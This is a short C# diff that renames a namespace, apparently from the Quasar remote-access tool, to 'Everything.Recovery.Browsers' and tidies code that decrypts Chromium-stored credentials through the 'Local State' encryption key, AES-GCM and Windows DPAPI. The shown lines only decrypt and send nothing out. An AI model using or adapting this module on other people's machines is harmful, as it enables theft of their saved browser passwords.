@@ -9,7 +9,7 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 
-namespace Quasar.Client.Recovery.Browsers
+namespace Everything.Recovery.Browsers
 {
     /// <summary>
     /// Provides methods to decrypt Chromium credentials.
@@ -24,7 +24,7 @@ namespace Quasar.Client.Recovery.Browsers
             {
                 if (File.Exists(localStatePath))
                 {
-                    string localState = File.ReadAllText(localStatePath);
+                    var localState = File.ReadAllText(localStatePath);
 
                     var subStr = localState.IndexOf("encrypted_key") + "encrypted_key".Length + 3;
 
@@ -44,9 +44,7 @@ namespace Quasar.Client.Recovery.Browsers
         {
             var cipherTextBytes = Encoding.Default.GetBytes(cipherText);
             if (cipherText.StartsWith("v10") && _key != null)
-            {
                 return Encoding.UTF8.GetString(DecryptAesGcm(cipherTextBytes, _key, 3));
-            }
             return Encoding.UTF8.GetString(ProtectedData.Unprotect(cipherTextBytes, null, DataProtectionScope.CurrentUser));
         }
 
